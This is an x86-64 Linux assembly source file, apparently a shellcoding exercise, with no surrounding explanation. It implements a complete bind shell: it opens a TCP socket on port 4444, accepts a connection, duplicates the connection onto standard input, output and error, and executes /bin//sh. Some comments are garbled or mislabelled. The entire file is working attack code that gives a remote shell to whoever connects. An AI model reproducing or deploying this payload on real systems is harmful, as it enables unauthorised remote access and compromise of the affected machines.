global _start

_start:
	; int socket(int domain, int type, int protocol);
	mov rax, 0x29
	mov rdi, 0x2 ; family AF_INET
	mov rsi, 0x1 ; SOCK_STREAM
	mov rdx, 0x0 ; protocol
	syscall

	; argv[1]
	mov rdi, rax ; obj sock
	xor rax, rax
	push rax

	mov dword [rsp-4], eax
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], 0x2
	sub rsp, 8

	; int bind(int sockfd, *addr, socklen_t)
	mov rax, 0x31
	mov rsi, rsp ; attribute address word create
	mov rdx, 0x10 ; socklen_t
	syscall

	; int listen(int sockfd, int backlog)
	mov rax, 50
	mov rsi, 2 ; argv[2]
	syscall ; mark sockfd how listen

	; int accept(int sockfd, *addr, socklen_t)
	mov rax, 43
	sub rsp, 16 ; 0x0
	mov rsi, rsp ; salve brakpoint
	mov byte [rsp-1], 16
	sub rsp, 1
	mov rdx, rsp
	syscall

	; collect conection of accept
	mov r9, rax

	; syscall close
	mov rax, 3
	syscall

	mov rdi, r9
	; dup2
	mov rax, 33
	mov rsi, 0
	syscall

	mov rax, 33
	mov rsi, 1
	syscall

	mov rax, 33
	mov rsi, 2
	syscall

	; shell bash
	xor rax, rax
	push rax

	mov rbx, 0x68732f2f6e69622f
	push rbx

	mov rdi, rsp

	push rax

	mov rdx, rsp

	push rdi

	mov rsi, rsp

	add rax, 59
	syscall
